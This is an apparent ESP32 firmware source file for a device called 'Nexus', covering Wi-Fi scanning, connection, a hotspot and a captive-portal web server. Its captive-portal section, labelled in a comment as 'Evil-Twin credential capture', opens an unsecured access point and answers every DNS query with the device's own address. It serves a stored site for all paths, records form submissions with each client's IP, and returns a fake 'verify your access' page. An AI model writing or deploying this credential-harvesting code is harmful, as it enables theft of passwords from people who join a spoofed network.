// wifi_net.cpp -- WiFi backend for Nexus. Lazy init/teardown; STA scan+connect,
// internet reachability probe, SoftAP hotspot. Single radio at a time.
#include "wifi_net.h"
#include <string.h>
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_mac.h"
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "esp_sntp.h"
#include "esp_http_server.h"
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <strings.h>
#include "sd_store.h"

#define BIT_CONNECTED  (1 << 0)
#define BIT_FAIL       (1 << 1)

static bool                g_running = false;
static bool                g_ap_mode = false;
static bool                g_have_ip = false;
static wifi_mode_t         g_mode    = WIFI_MODE_NULL;
static esp_netif_t*        g_sta = 0;
static esp_netif_t*        g_ap  = 0;
static EventGroupHandle_t  g_eg  = 0;
static esp_event_handler_instance_t g_h_wifi = 0;
static esp_event_handler_instance_t g_h_ip   = 0;
static esp_netif_ip_info_t g_ipinfo;

static void on_evt(void* arg, esp_event_base_t base, int32_t id, void* data) {
  (void)arg;
  if (base == WIFI_EVENT) {
    if (id == WIFI_EVENT_STA_DISCONNECTED) {
      g_have_ip = false;
      if (g_eg) xEventGroupSetBits(g_eg, BIT_FAIL);
    }
  } else if (base == IP_EVENT) {
    if (id == IP_EVENT_STA_GOT_IP) {
      ip_event_got_ip_t* e = (ip_event_got_ip_t*)data;
      g_ipinfo  = e->ip_info;
      g_have_ip = true;
      if (g_eg) xEventGroupSetBits(g_eg, BIT_CONNECTED);
    }
  }
}

bool wifi_net_running(void) { return g_running; }
size_t wifi_net_free_heap(void) { return esp_get_free_heap_size(); }

bool wifi_net_start(void) {
  if (g_running) return true;
  esp_err_t e = esp_netif_init();
  if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) return false;
  e = esp_event_loop_create_default();
  if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) return false;
  g_sta = esp_netif_create_default_wifi_sta();
  g_ap  = esp_netif_create_default_wifi_ap();
  if (!g_sta || !g_ap) {
    if (g_sta) { esp_netif_destroy_default_wifi(g_sta); g_sta = 0; }
    if (g_ap)  { esp_netif_destroy_default_wifi(g_ap);  g_ap = 0; }
    return false;
  }
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  if (esp_wifi_init(&cfg) != ESP_OK) {
    if (g_sta) { esp_netif_destroy_default_wifi(g_sta); g_sta = 0; }
    if (g_ap)  { esp_netif_destroy_default_wifi(g_ap);  g_ap  = 0; }
    return false;
  }
  g_eg = xEventGroupCreate();
  // Mark owned resources before registration so partial failures use one cleanup.
  g_running = true;
  if (!g_eg ||
      esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                          on_evt, 0, &g_h_wifi) != ESP_OK ||
      esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                          on_evt, 0, &g_h_ip) != ESP_OK ||
      esp_wifi_set_storage(WIFI_STORAGE_RAM) != ESP_OK) {
    wifi_net_stop();
    return false;
  }
  g_mode    = WIFI_MODE_NULL;
  g_ap_mode = false;
  g_have_ip = false;
  return true;
}

void wifi_net_stop(void) {
  if (!g_running) return;
  esp_wifi_stop();
  esp_wifi_deinit();
  if (g_h_wifi) {
    esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, g_h_wifi);
    g_h_wifi = 0;
  }
  if (g_h_ip) {
    esp_event_handler_instance_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, g_h_ip);
    g_h_ip = 0;
  }
  if (g_sta) { esp_netif_destroy_default_wifi(g_sta); g_sta = 0; }
  if (g_ap)  { esp_netif_destroy_default_wifi(g_ap);  g_ap  = 0; }
  if (g_eg)  { vEventGroupDelete(g_eg); g_eg = 0; }
  g_running = false;
  g_mode    = WIFI_MODE_NULL;
  g_ap_mode = false;
  g_have_ip = false;
}

static void enter_sta(void) {
  if (g_mode != WIFI_MODE_NULL) esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  g_mode    = WIFI_MODE_STA;
  g_ap_mode = false;
}

int wifi_net_scan(wifi_ap_t* out, int max) {
  if (!g_running || !out || max <= 0) return 0;
  enter_sta();
  wifi_scan_config_t sc = {};
  sc.show_hidden = false;
  if (esp_wifi_scan_start(&sc, true) != ESP_OK) return 0;
  uint16_t n = 0;
  if (esp_wifi_scan_get_ap_num(&n) != ESP_OK || n == 0) {
    esp_wifi_clear_ap_list();
    return 0;
  }
  wifi_ap_record_t* recs =
      (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * n);
  if (!recs) { esp_wifi_clear_ap_list(); return 0; }
  if (esp_wifi_scan_get_ap_records(&n, recs) != ESP_OK) {
    free(recs);
    esp_wifi_clear_ap_list();
    return 0;
  }
  int cnt = 0;
  for (int i = 0; i < (int)n && cnt < max; i++) {
    const char* s = (const char*)recs[i].ssid;
    if (s[0] == 0) continue;              /* skip hidden/empty */
    strncpy(out[cnt].ssid, s, WIFI_SSID_MAX - 1);
    out[cnt].ssid[WIFI_SSID_MAX - 1] = 0;
    memcpy(out[cnt].bssid, recs[i].bssid, 6);
    out[cnt].rssi     = recs[i].rssi;
    out[cnt].channel  = recs[i].primary;
    out[cnt].authmode = recs[i].authmode;
    cnt++;
  }
  free(recs);
  return cnt;
}

int wifi_net_connect(const char* ssid, const char* pass, int timeout_ms) {
  if (!g_running || !ssid) return 0;
  enter_sta();
  wifi_config_t wc = {};
  strncpy((char*)wc.sta.ssid, ssid, sizeof(wc.sta.ssid) - 1);
  if (pass && pass[0])
    strncpy((char*)wc.sta.password, pass, sizeof(wc.sta.password) - 1);
  wc.sta.threshold.authmode = WIFI_AUTH_OPEN;  /* accept any >= open */
  esp_wifi_set_config(WIFI_IF_STA, &wc);
  if (g_eg) xEventGroupClearBits(g_eg, BIT_CONNECTED | BIT_FAIL);
  g_have_ip = false;
  esp_wifi_connect();
  EventBits_t b = xEventGroupWaitBits(g_eg, BIT_CONNECTED | BIT_FAIL,
                                      pdFALSE, pdFALSE,
                                      pdMS_TO_TICKS(timeout_ms));
  return (b & BIT_CONNECTED) ? 1 : 0;
}

void wifi_net_disconnect(void) {
  if (!g_running) return;
  esp_wifi_disconnect();
  esp_wifi_stop();
  g_mode    = WIFI_MODE_NULL;
  g_have_ip = false;
}

bool wifi_net_sta_ipinfo(char* ip, char* gw, int len) {
  if (!g_have_ip) return false;
  if (ip) esp_ip4addr_ntoa(&g_ipinfo.ip, ip, len);
  if (gw) esp_ip4addr_ntoa(&g_ipinfo.gw, gw, len);
  return true;
}

int wifi_net_rssi(void) {
  if (!g_have_ip) return 0;
  wifi_ap_record_t ap;
  if (esp_wifi_sta_get_ap_info(&ap) != ESP_OK) return 0;
  return ap.rssi;
}

int wifi_net_check_internet(void) {
  if (!g_have_ip) return 0;
  struct addrinfo hints = {};
  struct addrinfo* res = 0;
  hints.ai_family   = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  if (getaddrinfo("connectivitycheck.gstatic.com", "80", &hints, &res) != 0 || !res) {
    if (res) freeaddrinfo(res);
    return 0;  /* DNS failed => no usable internet */
  }
  int s = socket(res->ai_family, res->ai_socktype, 0);
  if (s < 0) { freeaddrinfo(res); return 0; }
  struct timeval tv; tv.tv_sec = 5; tv.tv_usec = 0;
  setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  int ok = 0;
  if (connect(s, res->ai_addr, res->ai_addrlen) == 0) {
    const char* req =
        "GET /generate_204 HTTP/1.1\r\n"
        "Host: connectivitycheck.gstatic.com\r\n"
        "Connection: close\r\n\r\n";
    send(s, req, strlen(req), 0);
    char buf[64] = {0};
    int r = recv(s, buf, sizeof(buf) - 1, 0);
    if (r > 12 && strstr(buf, " 204")) ok = 1;  /* 204 => real internet */
  }
  close(s);
  freeaddrinfo(res);
  return ok;
}

bool wifi_net_ap_start(const char* ssid, const char* pass) {
  if (!g_running || !ssid || !ssid[0]) return false;
  if (g_mode != WIFI_MODE_NULL) esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  wifi_config_t wc = {};
  strncpy((char*)wc.ap.ssid, ssid, sizeof(wc.ap.ssid) - 1);
  wc.ap.ssid_len       = strlen((char*)wc.ap.ssid);
  wc.ap.channel        = 6;
  wc.ap.max_connection = 4;
  wc.ap.beacon_interval = 100;
  if (pass && strlen(pass) >= 8) {
    strncpy((char*)wc.ap.password, pass, sizeof(wc.ap.password) - 1);
    wc.ap.authmode = WIFI_AUTH_WPA2_PSK;
  } else {
    wc.ap.authmode = WIFI_AUTH_OPEN;
  }
  esp_wifi_set_config(WIFI_IF_AP, &wc);
  if (esp_wifi_start() != ESP_OK) return false;
  g_mode    = WIFI_MODE_AP;
  g_ap_mode = true;
  return true;
}

void wifi_net_ap_stop(void) {
  if (!g_running) return;
  esp_wifi_stop();
  g_mode    = WIFI_MODE_NULL;
  g_ap_mode = false;
}

int wifi_net_ap_clients(void) {
  if (!g_ap_mode) return 0;
  wifi_sta_list_t list;
  if (esp_wifi_ap_get_sta_list(&list) != ESP_OK) return 0;
  return list.num;
}

bool wifi_net_ap_ipinfo(char* ip, int len) {
  if (!g_ap_mode || !g_ap) return false;
  esp_netif_ip_info_t info;
  if (esp_netif_get_ip_info(g_ap, &info) != ESP_OK) return false;
  if (ip) esp_ip4addr_ntoa(&info.ip, ip, len);
  return true;
}

const char* wifi_net_auth_str(uint8_t a) {
  switch ((wifi_auth_mode_t)a) {
    case WIFI_AUTH_OPEN:            return "open";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "WPA";
    case WIFI_AUTH_WPA2_PSK:        return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
    case WIFI_AUTH_WPA3_PSK:        return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
    default:                        return "sec";
  }
}

bool wifi_net_sntp_sync(char* out, int len) {
  if (!g_have_ip) return false;
  esp_sntp_setoperatingmode(ESP_SNTP_OPMODE_POLL);
  esp_sntp_setservername(0, "pool.ntp.org");
  esp_sntp_init();
  setenv("TZ", "IST-5:30", 1);
  tzset();
  time_t now = 0;
  struct tm ti = {};
  int tries = 0;
  while (tries++ < 25) {
    vTaskDelay(pdMS_TO_TICKS(300));
    time(&now);
    localtime_r(&now, &ti);
    if (ti.tm_year > (2020 - 1900)) break;
  }
  esp_sntp_stop();
  if (ti.tm_year <= (2020 - 1900)) return false;
  strftime(out, len, "%Y-%m-%d\n%H:%M:%S IST", &ti);
  return true;
}

// ---------- Captive portal / mini web server ----------
#define WEB_DATA_DIR "/sites/data"   // SD dir backing the /api JSON store
#define WEB_IO_BUF   1460             // one TCP segment; static, reused (no heap)

static httpd_handle_t g_httpd = 0;
static char           g_web_root[80]  = "";   // SD dir holding the site
static char           g_web_index[80] = "";   // served for "/" and 404 fallback
static volatile int   g_cp_hits = 0;
static TaskHandle_t   g_dns_task = 0;
static volatile bool  g_dns_run = false;
static volatile int   g_cp_caps = 0;    // form submissions captured
static void (*g_cp_cap_cb)(const char* body, const char* ip) = 0;

void wifi_net_cp_set_capture(void (*cb)(const char* body, const char* ip)) {
  g_cp_cap_cb = cb;
}

static const char* web_ctype(const char* name) {
  const char* d = strrchr(name, '.');
  if (!d) return "text/plain";
  if (!strcasecmp(d, ".html") || !strcasecmp(d, ".htm"))  return "text/html";
  if (!strcasecmp(d, ".css"))  return "text/css";
  if (!strcasecmp(d, ".js"))   return "application/javascript";
  if (!strcasecmp(d, ".json")) return "application/json";
  if (!strcasecmp(d, ".png"))  return "image/png";
  if (!strcasecmp(d, ".jpg") || !strcasecmp(d, ".jpeg")) return "image/jpeg";
  if (!strcasecmp(d, ".gif"))  return "image/gif";
  if (!strcasecmp(d, ".svg"))  return "image/svg+xml";
  if (!strcasecmp(d, ".ico"))  return "image/x-icon";
  return "text/plain";
}

// Stream an SD file chunked through one reused static buffer (zero heap per
// request). Returns true if the file existed and was sent.
static bool web_stream(httpd_req_t* req, const char* sd_rel) {
  static char io[WEB_IO_BUF];
  char abs[192];
  snprintf(abs, sizeof(abs), "%s%s", sd_mount_point(), sd_rel);
  FILE* f = fopen(abs, "rb");
  if (!f) return false;
  httpd_resp_set_type(req, web_ctype(sd_rel));
  httpd_resp_set_hdr(req, "Cache-Control", "no-store");
  size_t n;
  while ((n = fread(io, 1, sizeof(io), f)) > 0) {
    if (httpd_resp_send_chunk(req, io, n) != ESP_OK) { fclose(f); return true; }
  }
  fclose(f);
  httpd_resp_send_chunk(req, NULL, 0);   // terminate chunked response
  return true;
}

// Copy at most n-1 bytes of a request URI (bounded; no snprintf truncation warn).
static void web_copy_uri(char* dst, size_t n, const char* src) {
  size_t L = strlen(src);
  if (L > n - 1) L = n - 1;
  memcpy(dst, src, L);
  dst[L] = 0;
}

// Strip the query string in place; reject path traversal. false = reject.
static bool web_sanitize(char* uri) {
  char* q = strchr(uri, '?'); if (q) *q = 0;
  if (strstr(uri, "..")) return false;
  return true;
}

static esp_err_t web_get(httpd_req_t* req) {
  char uri[128];
  web_copy_uri(uri, sizeof(uri), req->uri);
  if (!web_sanitize(uri)) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "bad path"); return ESP_OK; }
  char rel[224];
  // JSON store: GET /api/<name> -> /sites/data/<name>
  if (!strncmp(uri, "/api/", 5)) {
    snprintf(rel, sizeof(rel), "%s/%s", WEB_DATA_DIR, uri + 5);
    if (!web_stream(req, rel)) httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "no such key");
    return ESP_OK;
  }
  g_cp_hits++;
  if (!strcmp(uri, "/") || uri[0] == 0)
    snprintf(rel, sizeof(rel), "%s/%s", g_web_root, g_web_index);
  else
    snprintf(rel, sizeof(rel), "%s%s", g_web_root, uri);
  if (web_stream(req, rel)) return ESP_OK;
  // unknown path -> serve the index so OS captive-portal probes get redirected
  snprintf(rel, sizeof(rel), "%s/%s", g_web_root, g_web_index);
  if (web_stream(req, rel)) return ESP_OK;
  httpd_resp_set_type(req, "text/html");
  httpd_resp_send(req, "<html><body>Nexus</body></html>", HTTPD_RESP_USE_STRLEN);
  return ESP_OK;
}

// POST /api/<name> -> overwrite /sites/data/<name> with the request body,
// streamed to SD in WEB_IO_BUF chunks (single-writer model; no locking).
static esp_err_t web_post(httpd_req_t* req) {
  char uri[128];
  web_copy_uri(uri, sizeof(uri), req->uri);
  if (!web_sanitize(uri)) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "bad path"); return ESP_OK; }

  if (!strncmp(uri, "/api/", 5)) {
    static char io[WEB_IO_BUF];
    char abs[224];
    snprintf(abs, sizeof(abs), "%s%s/%s", sd_mount_point(), WEB_DATA_DIR, uri + 5);
    FILE* f = fopen(abs, "wb");
    if (!f) { httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "write failed"); return ESP_OK; }
    int rem = req->content_len;
    while (rem > 0) {
      int want = rem < (int)sizeof(io) ? rem : (int)sizeof(io);
      int r = httpd_req_recv(req, io, want);
      if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
      if (r <= 0) break;
      fwrite(io, 1, (size_t)r, f);
      rem -= r;
    }
    fclose(f);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
  }

  // Non-/api POST = Evil-Twin credential capture: read the urlencoded form,
  // grab the client IP, hand both to the callback (logs to SD), return a
  // plausible "connecting" page.
  char body[513];
  int total = 0, rem = req->content_len;
  if (rem > (int)sizeof(body) - 1) rem = (int)sizeof(body) - 1;
  while (rem > 0) {
    int r = httpd_req_recv(req, body + total, rem);
    if (r <= 0) { if (r == HTTPD_SOCK_ERR_TIMEOUT) continue; break; }
    total += r; rem -= r;
  }
  body[total] = 0;
  char ip[20] = "?";
  int sock = httpd_req_to_sockfd(req);
  if (sock >= 0) {
    struct sockaddr_in6 sa; socklen_t sl = sizeof(sa);
    if (getpeername(sock, (struct sockaddr*)&sa, &sl) == 0) {
      struct sockaddr_in* s4 = (struct sockaddr_in*)&sa;
      inet_ntoa_r(s4->sin_addr, ip, sizeof(ip));
    }
  }
  if (total > 0) { g_cp_caps++; if (g_cp_cap_cb) g_cp_cap_cb(body, ip); }
  httpd_resp_set_type(req, "text/html");
  httpd_resp_set_hdr(req, "Cache-Control", "no-store");
  httpd_resp_send(req,
    "<html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "</head><body style=\"font-family:sans-serif;text-align:center;padding-top:40px\">"
    "<h3>Connecting...</h3><p>Please wait while we verify your access.</p></body></html>",
    HTTPD_RESP_USE_STRLEN);
  return ESP_OK;
}

// DELETE /api/<name> -> remove /sites/data/<name>.
static esp_err_t web_delete(httpd_req_t* req) {
  char uri[128];
  web_copy_uri(uri, sizeof(uri), req->uri);
  if (!web_sanitize(uri) || strncmp(uri, "/api/", 5)) {
    httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "not found"); return ESP_OK;
  }
  char rel[192];
  snprintf(rel, sizeof(rel), "%s/%s", WEB_DATA_DIR, uri + 5);
  sd_delete(rel, false);
  httpd_resp_set_type(req, "application/json");
  httpd_resp_set_hdr(req, "Cache-Control", "no-store");
  httpd_resp_sendstr(req, "{\"ok\":true}");
  return ESP_OK;
}

static void dns_task(void* arg) {
  (void)arg;
  int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock < 0) { g_dns_task = 0; vTaskDelete(NULL); return; }
  struct sockaddr_in sa = {};
  sa.sin_family = AF_INET;
  sa.sin_port = htons(53);
  sa.sin_addr.s_addr = htonl(INADDR_ANY);
  if (bind(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
    close(sock); g_dns_task = 0; vTaskDelete(NULL); return;
  }
  struct timeval tv; tv.tv_sec = 1; tv.tv_usec = 0;
  setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  uint8_t buf[256];
  while (g_dns_run) {
    struct sockaddr_in from; socklen_t fl = sizeof(from);
    int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr*)&from, &fl);
    if (n < 12) continue;
    buf[2] |= 0x80;            /* QR = response */
    buf[3]  = 0x00;            /* RA/Z/RCODE = 0 */
    buf[6]  = 0x00; buf[7] = 0x01;  /* ANCOUNT = 1 */
    if (n + 16 > (int)sizeof(buf)) continue;
    int p = n;
    buf[p++] = 0xC0; buf[p++] = 0x0C;             /* name -> offset 12 */
    buf[p++] = 0x00; buf[p++] = 0x01;             /* type A */
    buf[p++] = 0x00; buf[p++] = 0x01;             /* class IN */
    buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x3C; /* TTL 60 */
    buf[p++] = 0x00; buf[p++] = 0x04;             /* RDLENGTH 4 */
    buf[p++] = 192; buf[p++] = 168; buf[p++] = 4; buf[p++] = 1;  /* 192.168.4.1 */
    sendto(sock, buf, p, 0, (struct sockaddr*)&from, fl);
  }
  close(sock);
  g_dns_task = 0;
  vTaskDelete(NULL);
}

bool wifi_net_cp_start(const char* ssid, const char* webroot, const char* index) {
  if (!g_running || !ssid || !ssid[0] || !webroot || !index) return false;
  if (!wifi_net_ap_start(ssid, "")) return false;   /* open AP */
  snprintf(g_web_root,  sizeof(g_web_root),  "%s", webroot);
  snprintf(g_web_index, sizeof(g_web_index), "%s", index);
  g_cp_hits = 0; g_cp_caps = 0;
  sd_make_dir(WEB_DATA_DIR);                 /* JSON store dir (harmless if it exists) */
  httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
  hc.uri_match_fn     = httpd_uri_match_wildcard;
  hc.max_uri_handlers = 8;
  hc.lru_purge_enable = true;
  hc.stack_size       = 8192;                /* fopen/FATFS VFS needs > the 4K default */
  if (httpd_start(&g_httpd, &hc) != ESP_OK) { wifi_net_ap_stop(); return false; }
  httpd_uri_t g = {}; g.uri = "/*"; g.method = HTTP_GET;    g.handler = web_get;
  httpd_register_uri_handler(g_httpd, &g);
  httpd_uri_t p = {}; p.uri = "/*"; p.method = HTTP_POST;   p.handler = web_post;
  httpd_register_uri_handler(g_httpd, &p);
  httpd_uri_t d = {}; d.uri = "/*"; d.method = HTTP_DELETE; d.handler = web_delete;
  httpd_register_uri_handler(g_httpd, &d);
  g_dns_run = true;
  if (xTaskCreate(dns_task, "cp_dns", 3072, 0, 5, &g_dns_task) != pdPASS)
    g_dns_task = 0;
  return true;
}

void wifi_net_cp_stop(void) {
  g_dns_run = false;
  if (g_httpd) { httpd_stop(g_httpd); g_httpd = 0; }
  for (int i = 0; i < 30 && g_dns_task; i++) vTaskDelay(pdMS_TO_TICKS(50));
  wifi_net_ap_stop();
  g_web_root[0] = 0; g_web_index[0] = 0;
}

int wifi_net_cp_hits(void) { return g_cp_hits; }
int wifi_net_cp_caps(void) { return g_cp_caps; }
